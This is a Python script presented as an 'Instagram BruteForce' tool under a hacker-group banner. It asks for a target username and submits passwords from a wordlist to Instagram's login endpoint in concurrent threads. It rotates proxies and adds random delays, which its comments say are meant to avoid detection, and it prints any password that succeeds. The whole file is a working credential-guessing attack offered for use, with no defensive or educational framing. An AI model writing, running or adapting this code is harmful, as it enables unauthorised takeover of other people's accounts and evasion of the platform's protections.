import time
import sys
import random
import os
import requests
import pyfiglet
from concurrent.futures import ThreadPoolExecutor

# ASCII Art
banner = pyfiglet.figlet_format("RAVEES")
print(banner)
print('#REMEMBER RAVEES #REMEMBER MOHAMMAD KAIF #IMANNINFOSEC #TEAM SYNC')
print('EAGLES OF INDAINA')
print('DONT TRY TO CHASE US WE ARE UNBEATABLE WE ARE UNDEFEATABLE')

# Instagram login URL
POST_URL = 'https://www.instagram.com/accounts/login/ajax/'
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'Referer': 'https://www.instagram.com/accounts/login/',
}

# Random delay between requests
DELAY = random.uniform(1, 3)

# Load password file
try:
    with open('passwords.txt', 'r') as file:
        PASSWORDS = file.readlines()
except IOError:
    print('\n\tPassword file not found. Please create a "passwords.txt" file.\n')
    sys.exit()

# Proxy list (optional)
PROXIES = [
    'http://proxy1:port',
    'http://proxy2:port',
    # Add more proxies here
]

# Function to get a random proxy
def get_random_proxy():
    return random.choice(PROXIES) if PROXIES else None

# Function to test a password
def test_password(username, password, proxy=None):
    session = requests.Session()
    session.headers.update(HEADERS)
    if proxy:
        session.proxies = {'http': proxy, 'https': proxy}

    login_data = {
        'username': username,
        'password': password,
    }

    try:
        response = session.post(POST_URL, data=login_data)
        response_data = response.json()

        if response_data.get('authenticated', False):
            print(f'\n[+] Password found: {password}')
            return True
        elif response_data.get('checkpoint_required', False):
            print('[-] CAPTCHA or checkpoint required. Try again later.')
            return False
        else:
            print(f'[!] Attempt failed with password: {password}')
            return False
    except Exception as e:
        print(f'[!] Error: {e}')
        return False

# Main function
def main():
    print('\n---------- Welcome To Instagram BruteForce ----------\n')
    username = input('Enter Instagram Username: ').strip()

    print("\nTarget Username: ", username)
    print("\nTrying Passwords from list ...")

    # Use ThreadPoolExecutor for concurrent requests
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = []
        for i, password in enumerate(PASSWORDS):
            password = password.strip()
            if len(password) < 6:
                continue

            print(f'{i + 1} : {password}')
            proxy = get_random_proxy()
            futures.append(executor.submit(test_password, username, password, proxy))

            # Random delay to avoid detection
            time.sleep(DELAY)

        # Wait for all threads to complete
        for future in futures:
            if future.result():
                break

if __name__ == "__main__":
    main()
